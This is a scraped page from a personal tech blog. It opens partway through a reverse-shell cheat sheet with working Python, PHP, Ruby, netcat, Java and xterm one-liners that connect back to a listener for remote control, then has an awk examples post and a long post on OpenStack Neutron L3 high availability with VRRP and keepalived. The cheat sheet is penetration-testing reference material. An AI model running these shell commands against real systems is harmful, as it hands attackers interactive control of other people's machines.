<p>There’s also an&nbsp;<a href="http://www.plenz.com/reverseshell" target="_blank" rel="external">alternative PERL revere shell here</a>.</p>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>This was tested under Linux / Python 2.7:</p>
<pre>
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</pre>

<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>This code assumes that the TCP connection uses file descriptor 3. &nbsp;This worked on my test system. &nbsp;If it doesn’t work, try 4, 5, 6…</p>
<pre>
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3>&3 2>&3");'
</&3></pre>

<p>If you want a .php file to upload, see the more featureful and robust <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="external">php-reverse-shell</a>.</p>
<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><pre>
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d>&%d 2>&%d",f,f,f)'
</&%d></pre>

<h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.</p>
<pre>
nc -e /bin/sh 10.0.0.1 1234
</pre>

<p>If you have the wrong version of netcat installed, <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498" target="_blank" rel="external">Jeff Price points out here</a> that you might still be able to get your reverse shell back like this:</p>
<pre>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
</pre>

<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><pre>
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 2="" |="" while="" read="" line;="" do="" \$line="">&5 >&5; done"] as String[])
p.waitFor()
</&5></pre>

<p>[Untested submission from anonymous reader]</p>
<h3 id="xterm"><a href="#xterm" class="headerlink" title="xterm"></a>xterm</h3><p>One of the simplest forms of reverse shell is an xterm session. &nbsp;The following command should be run on the server. &nbsp;It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<pre>
xterm -display 10.0.0.1:1
</pre>

<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). &nbsp;One way to do this is with Xnest (to be run on your system):</p>
<pre>
Xnest :1
</pre>

<p>You’ll need to authorise the target to connect to you (command also run on your host):</p>
<pre>
xhost +targetip
</pre>


          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2015/01/27/awk-examples/" itemprop="url">
                  awk examples
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2015-01-28T00:00:00+08:00" content="2015-01-28">
              2015-01-28
            </time>
          </span>

          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2015/01/27/awk-examples/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/01/27/awk-examples/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li>precede each line by line number</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;print NR, $0&#125;'</span> filename</div></pre></td></tr></table></figure>
<ul>
<li>replace first field by line number</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;$1=NR; print&#125;'</span> filename</div></pre></td></tr></table></figure>
<ul>
<li>print field 1 and field 2</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;print $1,$2&#125;'</span> fielname</div></pre></td></tr></table></figure>
<ul>
<li>print last field </li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;print $NF&#125;'</span> filename</div></pre></td></tr></table></figure>
<ul>
<li>print non empty lines</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'NF&gt;0&#123;print $0&#125;'</span> filename</div></pre></td></tr></table></figure>
<ul>
<li>print if more than 4 fields</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'NF&gt;4&#123;print $0&#125;'</span> filename</div></pre></td></tr></table></figure>
<ul>
<li><p>print matching lines (egrep)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'/test.*/&#123;print $0&#125;'</span>  filename</div></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li>print lines where first field matches</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'$1 ~ /^print.*/&#123;print $0&#125;'</span> filename</div></pre></td></tr></table></figure>
<ul>
<li>calcuting sum of field 2</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'BEGIN&#123;sum=0&#125;&#123;sum+=$2&#125;END&#123;print sum&#125;'</span> filename</div></pre></td></tr></table></figure>
<ul>
<li>for loop</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;sum=0; for(i=1;i&lt;=NF;i++)sum+=$i; print sum&#125;'</span> filename</div></pre></td></tr></table></figure>
<ul>
<li>make arrays</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;n = split($0, array); print array[1], array[3]&#125; '</span> filename</div></pre></td></tr></table></figure>
<ul>
<li>reverse a file</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;x[NR]=$0&#125; END&#123;for(i=NR;i&gt;0;i--)print x[i]&#125;'</span> filename</div></pre></td></tr></table></figure>
<ul>
<li>Associative Arrays </li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;amount[$1]=$2&#125; END&#123;for(name in amount) print name, amount[name]&#125;'</span> filename</div></pre></td></tr></table></figure>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2015/01/26/neutron-layer-3-high-availability/" itemprop="url">
                  Neutron Layer 3 High Availability
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2015-01-27T00:00:00+08:00" content="2015-01-27">
              2015-01-27
            </time>
          </span>

          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2015/01/26/neutron-layer-3-high-availability/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/01/26/neutron-layer-3-high-availability/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>L3 Agent Low Availability</strong></p>
<p>Today, you can utilize multiple network nodes to achieve load sharing, but not high availability or redundancy. Assuming three network nodes, creation of new routers will be scheduled and distributed amongst those three nodes. However, if a node&nbsp;drops, all routers on that node will cease to exist as well as any traffic normally forwarded by those routers. Neutron, in the Icehouse release, doesn’t support any built-in solution.</p>
<p><strong>A Detour to the DHCP Agent</strong></p>
<p>DHCP agents are a different beast altogether – The DHCP protocol allows for the co-existence of multiple DHCP servers all serving the same pool, at the same time.</p>
<p>By changing:</p>
<pre>
<span class="skimlinks-unlinked">neutron.conf</span>:
dhcp_agents_per_network = X
</pre>

<p>You will change the DHCP scheduler to schedule X DHCP agents per network. So, for a deployment with 3 network nodes, and setting&nbsp;dhcp_agents_per_network to 2, every Neutron network will be served by 2 DHCP agents out of 3. How does this work?</p>
<p><img src="http://assafmuller.files.wordpress.com/2014/08/dhcp_ha_topology1.png?w=696" alt="dhcp_ha_topology"></p>
<p>First, let’s take a look at the story from a baremetal perspective, outside of the cloud world. When the workstation is connected to a subnet&nbsp;in the 10.0.0.0/24 subnet, it broadcasts a DHCP discover. Both DHCP servers dnsmasq1 and dnsmasq2 (Or other implementations of a DHCP server) receive the broadcast and respond with an offer for 10.0.0.2. Assuming that the first server’s response was received by the workstation first, it will then broadcast a request for 10.0.0.2, and specify the IP address of dnsmasq1 – 10.0.0.253. Both servers receive the broadcast, but only dnsmasq1 responds with an ACK.&nbsp;Since all DHCP communication is via broadcasts, server 2 also receives the ACK,&nbsp;and can mark 10.0.0.2 as taken by AA:BB:CC:11:22:33, so as to not offer it to other workstations. To summarize, all communication between clients and servers is done via broadcasts and thus the state (What IPs are used at any given time, and by who) can be distributed across the servers correctly.</p>
<p>In the Neutron case, the assignment from MAC to IP is configured on each dnsmasq server beforehand, when the Neutron port is created. Thus, both dnsmasq leases file will hold the AA:BB:CC:11:22:33 to 10.0.0.2 mapping before the DHCP request is even broadcast. As you can see, DHCP HA is&nbsp;supported at the protocol level.</p>
<p><strong>Back to the Lowly Available L3 Agent</strong></p>
<p>L3 agents don’t (Currently) have any of these fancy tricks that DHCP offers, and yet the people demand high availability. So what are the people doing?</p>
<ul>
<li>Pacemaker / Corosync – Use external clustering technologies to specify a standby network node for an active one. The standby node will essentially sit there looking pretty, and when a failure is detected with the active node, the L3 agent will be started on the standby node. The two nodes are configured with the same hostname so that when the secondary agent goes live and synchronizes with the server, it identifies itself with the same ID and thus manages&nbsp;the same routers.</li>
<li>Another type of solution writes a script that runs as a cron job. This would be a Python SDK script that would use the API to get a list of dead agents, get all the routers on that agent, and reschedule them to other agents.</li>
<li>In the Juno time frame, look for this patch&nbsp;<a href="https://review.openstack.org/#/c/110893/&nbsp;by" target="_blank" rel="external">https://review.openstack.org/#/c/110893/&nbsp;by</a> <a href="http://homes.soic.indiana.edu/ktbenton/" target="_blank" rel="external">Kevin Benton</a> to bake rescheduling into Neutron itself.</li>
</ul>
<p><strong>Rescheduling Routers Takes a Long, Long Time</strong></p>
<p>All solutions listed suffer from a substantial failover time, if only for the simple fact that configuring a non-trivial amount of routers on the new node(s) takes quite a while. Thousands of routers take hours to&nbsp;finish the rescheduling and configuration process. The people demand fast failover!</p>
<p><strong>Distributed Virtual Router</strong></p>
<p>DVR has multiple documents explaining how it works:</p>
<ul>
<li><a href="http://specs.openstack.org/openstack/neutron-specs/specs/juno/neutron-ovs-dvr.html" target="_blank" rel="external">http://specs.openstack.org/openstack/neutron-specs/specs/juno/neutron-ovs-dvr.html</a></li>
<li><a href="https://docs.google.com/document/d/1jCmraZGirmXq5V1MtRqhjdZCbUfiwBhRkUjDXGt5QUQ/" target="_blank" rel="external">https://docs.google.com/document/d/1jCmraZGirmXq5V1MtRqhjdZCbUfiwBhRkUjDXGt5QUQ/</a></li>
<li><a href="https://docs.google.com/document/d/1depasJSnGZPOnRLxEC_PYsVLcGVFXZLqP52RFTe21BE/" target="_blank" rel="external">https://docs.google.com/document/d/1depasJSnGZPOnRLxEC_PYsVLcGVFXZLqP52RFTe21BE/</a></li>
</ul>
<p>The gist is that it moves routing to the compute nodes, rendering the L3 agent on the network nodes pointless. Or does it?</p>
<ul>
<li>DVR handles only floating IPs, leaving SNAT to the L3 agents on the network nodes</li>
<li>Doesn’t work with VLANs, only works with <a href="http://assafmuller.wordpress.com/2013/10/14/gre-tunnels-in-openstack-neutron/" title="GRE Tunnels in OpenStack Neutron" target="_blank" rel="external">tunnels</a> and <a href="http://assafmuller.wordpress.com/2014/02/23/ml2-address-population/" title="ML2 – Address Population" target="_blank" rel="external">L2pop</a> enabled</li>
<li>Requires external connectivity on every compute node</li>
<li>Generally speaking, is a significant departure from Havana or Icehouse Neutron based clouds, while L3 HA is a simpler change to make for your deployment</li>
</ul>
<p>Ideally you would use DVR together with L3 HA. Floating IP traffic would be routed directly by your compute nodes, while SNAT traffic would go through the HA L3 agents on the network nodes.</p>
<p><strong>Layer 3 High Availability</strong></p>
<p>The Juno targeted L3 HA solution uses the popular Linux keepalived tool, which uses VRRP internally. First, then, let’s discuss VRRP.</p>
<p><strong>What is VRRP, how does it work in the physical world?</strong></p>
<p>Virtual Router Redundancy Protocol is a<a href="http://en.wikipedia.org/wiki/First-hop_redundancy_protocols" target="_blank" rel="external"> first hop redundancy protocol</a>&nbsp;– It aims to provide high availability of the network’s default gateway, or the next hop of a route. What problem does it solve? In a network topology with two routers providing internet connectivity, you could assign half of the network’s default gateway to the first router’s IP address, and the other half to the second router.</p>
<p><img src="http://assafmuller.files.wordpress.com/2014/08/router_ha_topology_before_vrrp.png?w=696" alt="router_ha_topology_before_vrrp"></p>
<p>This would provide load sharing, but what happens if one router loses connectivity? Herein comes the idea of a virtual IP address, or a floating address, which will be configured as the network’s default gateway. During a failover, the standby routers won’t receive VRRP hello messages from the master and will thus perform an election process, with the winning router acting as the active gateway, and the others remain as standby. The active router configures the virtual IP address (Or VIP for short), on its internal, LAN facing interface, and responds to ARP requests with a virtual MAC address. The network computers already have entries in their ARP caches (For the VIP + virtual MAC address) and have no reason to resend an ARP request. Following the election process, the virtuous standby router becomes the new active instance, and sends a gratuitous ARP request – Proclaiming to the network that the VIP + MAC pair now belong to it. The switches comprising the network move the virtual MAC address from the old port to the new.</p>
<p><a href="https://assafmuller.files.wordpress.com/2014/08/switch_moves_mac.png" target="_blank" rel="external"><img src="http://assafmuller.files.wordpress.com/2014/08/switch_moves_mac.png?w=696" alt="switch_moves_mac"></a></p>
<p>By doing so, traffic to the default gateway will reach the correct (New) active router. Note that this approach does not accomplish load sharing, in the sense that all traffic is forwarded through the active router. (Note that in the Neutron use case, load sharing is not accomplished at the individual router level, but at the node level, assuming a non-trivial amount of routers). How does one accomplish load sharing at the router resolution? VRRP groups: The VRRP header includes a Virtual Router Identifier, or VRID. Half of the network hosts will configure the first VIP, and the other half the second. In the case of a failure, the VIP previously found on the failing router will transfer to another one.</p>
<p><a href="https://assafmuller.files.wordpress.com/2014/08/router_ha_two_vrrp_groups.png" target="_blank" rel="external"><img src="http://assafmuller.files.wordpress.com/2014/08/router_ha_two_vrrp_groups.png?w=696&amp;h=945" alt="router_ha_two_vrrp_groups"></a></p>
<p>The observant reader will have identified a problem – What if the active router loses connectivity to the internet? Will it remain as the active router, unable to route packets? VRRP adds the capability to monitor the external link and relinquish its role as the active router in case of a failure.<a href="https://assafmuller.files.wordpress.com/2014/08/router_ha_external_trap.png" target="_blank" rel="external"><img src="http://assafmuller.files.wordpress.com/2014/08/router_ha_external_trap.png?w=696" alt="router_ha_external_trap"></a></p>
<p>Note: As far as IP addressing goes, it’s possible to operate in two modes:</p>
<ol>
<li>Each router gets an IP address, regardless of its VRRP state. The master router is configured with the VIP as an additional &nbsp;or secondary address.</li>
<li>Only the VIP is configured. IE: The master router will hold the VIP while the slaves will have no IPs configured whatsoever.</li>
</ol>
<p><strong>VRRP – The Dry Facts</strong></p>
<ul>
<li>Encapsulated directly in the IP protocol</li>
<li>Active instance uses multicast address 224.0.0.18, MAC&nbsp;01-00-5E-00-00-12 when sending hello messages to its standby routers</li>
<li>The virtual MAC address is of the form:&nbsp;00-00-5E-00-01-{VRID}, thus only 256 different VRIDs (0 to 255) can exist in a single broadcast domain</li>
<li>The election process uses a user configurable priority, from 1 to 255, the higher the better</li>
<li>Preemptive elections, like in other network protocols, means that if a standby is configured with a higher priority, or comes back after losing its connectivity (And previously acting as the active instance) it will resume its role as the active router</li>
<li>Non-preemptive elections mean that when an active router loses its connectivity and comes back up, it will remain in a standby role</li>
<li>The hello internal is configurable (Say: Every T seconds), and standby routers perform an election process if they haven’t received a hello message from the master after 3T seconds</li>
</ul>
<p><strong>Back to Neutron-land</strong></p>
<p>L3 HA starts a keepalived instance in every router namespace. The different router instances talk to one another via a dedicated HA network, one per tenant. This network is created under the blank tenant to hide it from the CLI and GUI. The HA network is a &nbsp;Neutron tenant network, same as every other network, and uses the default segmentation technology. HA routers have an ‘HA’ device in their namespace: When a HA router is created, it is scheduled to a number of network nodes, along with a port per network node, belonging to the tenant’s HA network. keepalived traffic is forwarded through the HA device (As specified in the <span class="skimlinks-unlinked">keepalived.conf</span> file used by the keepalived instance in the router namespace). Here’s the output of ‘ip address’ in the router namespace:</p>
<pre>
[stack@vpn-6-88 ~]$ sudo ip netns exec qrouter-b30064f9-414e-4c98-ab42-646197c74020 ip address
1: lo: <loopback,up,lower_up> mtu 65536 qdisc noqueue state UNKNOWN group default 
    ...
2794: **ha-45249562-ec**: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue state UNKNOWN group default 
    link/ether 12:34:56:78:2b:5d brd ff:ff:ff:ff:ff:ff
    inet 169.254.0.2/24 brd 169.254.0.255 scope global ha-54b92d86-4f
       valid_lft forever preferred_lft forever
    inet6 fe80::1034:56ff:fe78:2b5d/64 scope link 
       valid_lft forever preferred_lft forever
2795: qr-dc9d93c6-e2: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue state UNKNOWN group default 
    link/ether ca:fe:de:ad:be:ef brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.1/24 scope global qr-0d51eced-0f
       valid_lft forever preferred_lft forever
    inet6 fe80::c8fe:deff:fead:beef/64 scope link 
       valid_lft forever preferred_lft forever
2796: qg-843de7e6-8f: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue state UNKNOWN group default 
    link/ether ca:fe:de:ad:be:ef brd ff:ff:ff:ff:ff:ff
    inet 19.4.4.4/24 scope global qg-75688938-8d
       valid_lft forever preferred_lft forever
    inet6 fe80::c8fe:deff:fead:beef/64 scope link 
       valid_lft forever preferred_lft forever
</broadcast,multicast,up,lower_up></broadcast,multicast,up,lower_up></broadcast,multicast,up,lower_up></loopback,up,lower_up></pre>

<p>That is the output for the master instance. The same router on another node would have no IP address on the ha, qr, or qg devices. It would have no floating IPs or routing entries. These are persisted as configuration values in <span class="skimlinks-unlinked">keepalived.conf</span>, and when keepalived detects the master instance failing, these addresses (Or: VIPs) are configured by keepalived on the appropriate devices. Here’s an example of <span class="skimlinks-unlinked">keepalived.conf</span>, for the same router shown above:</p>
<pre>
vrrp_sync_group VG_1 {
    group {
        VR_1
    }
    notify_backup "/path/to/<span class="skimlinks-unlinked">notify_backup.sh</span>"
    notify_master "/path/to/<span class="skimlinks-unlinked">notify_master.sh</span>"
    notify_fault "/path/to/<span class="skimlinks-unlinked">notify_fault.sh</span>"
}
vrrp_instance VR_1 {
    state BACKUP
    interface ha-45249562-ec
    virtual_router_id 1
    priority 50
    nopreempt
    advert_int 2
    track_interface {
        ha-45249562-ec
    }
    virtual_ipaddress {
        19.4.4.4/24 dev qg-843de7e6-8f
    }
    virtual_ipaddress_excluded {
        10.0.0.1/24 dev qr-dc9d93c6-e2
    }
    virtual_routes {
        0.0.0.0/0 via 19.4.4.1 dev qg-843de7e6-8f
    }
}
</pre>

<p>What are those notify scripts? These are scripts that keepalived executes upon transition to master, backup, or fault. Here’s the contents of the master script:</p>
<pre>
#!/usr/bin/env bash
neutron-ns-metadata-proxy --pid_file=/tmp/tmpp_6Lcx/tmpllLzNs/external/pids/b30064f9-414e-4c98-ab42-646197c74020/pid --metadata_proxy_socket=/tmp/tmpp_6Lcx/tmpllLzNs/metadata_proxy --router_id=b30064f9-414e-4c98-ab42-646197c74020 --state_path=/opt/openstack/neutron --metadata_port=9697 --debug --verbose
echo -n master > /tmp/tmpp_6Lcx/tmpllLzNs/ha_confs/b30064f9-414e-4c98-ab42-646197c74020/state
</pre>

<p>The master script simply opens up the metadata proxy, and writes the state to a state file, which can be later read by the L3 agent. The backup and fault scripts kill the proxy and write their respective states to the aforementioned state file. This means that the metadata proxy will be live only on the master router instance.</p>
<p><strong>* Aren’t We Forgetting the Metadata Agent?</strong></p>
<p>Simply enable the agent on every network node and you’re good to go.</p>
<p><strong>Future Work &amp; Limitations</strong></p>
<ul>
<li>TCP connection tracking – With the current implementation, TCP sessions are broken on failover. The idea is to use conntrackd in order to replicate the session states across HA routers, so that when the failover finishes, TCP sessions will continue where they left off.</li>
<li>Where is the master instance hosted? As it is now it is impossible for the admin to know which network node is hosting the master instance of a HA router. The plan is for the agents to report this information and for the server to expose it via the API.</li>
<li>Evacuating an agent – Ideally bringing down a node for maintenance should cause all of the HA router instances on said node to relinquish their master states, speeding up the failover process.</li>
<li>Notifying L2pop of VIP movements – Consider the IP/MAC of the router on a tenant network. Only the master instance will actually have the IP configured, but the same Neutron port and same MAC will show up on all participating network nodes. This might have adverse effects on the L2pop mechanism driver, as it expects a MAC address in a single location in the network. The plan to solve this deficiency is to send an RPC message from the agent whenever it detects a VRRP state change, so that when a router becomes the master, the controller is notified, which can then update the L2pop state.</li>
<li>FW, VPN and LB as a service integration. Both DVR and L3 HA have issues integrating with the advanced services, and a more serious look will be taken during the Kilo cycle.</li>
<li>One HA network per tenant. This implies a limit of 255 HA routers per tenant, as each router takes up a VRID, and the VRRP protocol allows 255 distinct VRID values in a single broadcast domain.</li>
</ul>
<p><strong>Usage &amp; Configuration</strong></p>
<pre>
<span class="skimlinks-unlinked">neutron.conf</span>:
l3_ha = True
max_l3_agents_per_router = 2
min_l3_agents_per_router = 2
</pre>

<ul>
<li>l3_ha = True means that all router creations will default to HA (And not legacy) routers. This is turned off by default.</li>
<li>You can set the max to a number between min and the number of network nodes in your deployment. If you deploy 4 net nodes but set max to 2, only two l3 agents will be used per HA router (One master, one slave).</li>
<li>min is used as a sanity check: If you have two network nodes and one goes out momentarily, any new routers created during that time period will fail as you need at least <min> L3 agents up when creating a HA router.</min></li>
</ul>
<p>l3_ha controls the default, while the CLI allows an admin (And only admins) to override that setting on a per router basis:</p>
<pre>
neutron router-create --ha=<true |="" false=""> router1
</true></pre>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/16/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><span class="page-number current">17</span><a class="page-number" href="/page/18/">18</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><a class="extend next" rel="next" href="/page/18/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/qrcode.jpg"
               alt="Feisky" />
          <p class="site-author-name" itemprop="name">Feisky</p>
          <p class="site-description motion-element" itemprop="description">Notes about anything.</p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">100</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">14</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">29</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/feiskyer" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/feisky" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                  Twitter
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/371069890" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                  Weibo
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.cnblogs.com/feisky/" target="_blank" title="博客园">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  博客园
                </a>
              </span>
            
          
        </div>

        
        

        
        

      </section>

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2017</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Feisky</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>

        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>



  



  

    <script type="text/javascript">
      var disqus_shortname = 'feiskyblog';
      var disqus_identifier = 'page/17/index.html';
      var disqus_title = "";
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  




  
  
  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length == 0) {
       search_path = "search.xml";
    }
    var path = "/" + search_path;
    // monitor main search box;

    function proceedsearch() {
      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
      $('.popup').toggle();

    }
    // search function;
    var searchFunc = function(path, search_id, content_id) {
    'use strict';
    $.ajax({
        url: path,
        dataType: "xml",
        async: true,
        success: function( xmlResponse ) {
            // get the contents from search data
            isfetched = true;
            $('.popup').detach().appendTo('.header-inner');
            var datas = $( "entry", xmlResponse ).map(function() {
                return {
                    title: $( "title", this ).text(),
                    content: $("content",this).text(),
                    url: $( "url" , this).text()
                };
            }).get();
            var $input = document.getElementById(search_id);
            var $resultContent = document.getElementById(content_id);
            $input.addEventListener('input', function(){
                var matchcounts = 0;
                var str='<ul class=\"search-result-list\">';
                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                $resultContent.innerHTML = "";
                if (this.value.trim().length > 1) {
                // perform local searching
                datas.forEach(function(data) {
                    var isMatch = false;
                    var content_index = [];
                    var data_title = data.title.trim().toLowerCase();
                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
                    var data_url = decodeURIComponent(data.url);
                    var index_title = -1;
                    var index_content = -1;
                    var first_occur = -1;
                    // only match artiles with not empty titles and contents
                    if(data_title != '') {
                        keywords.forEach(function(keyword, i) {
                            index_title = data_title.indexOf(keyword);
                            index_content = data_content.indexOf(keyword);
                            if( index_title >= 0 || index_content >= 0 ){
                                isMatch = true;
								if (i == 0) {
                                    first_occur = index_content;
                                }
                            } 
							
                        });
                    }
                    // show search results
                    if (isMatch) {
                        matchcounts += 1;
                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
                        var content = data.content.trim().replace(/<[^>]+>/g,"");
                        if (first_occur >= 0) {
                            // cut out 100 characters
                            var start = first_occur - 20;
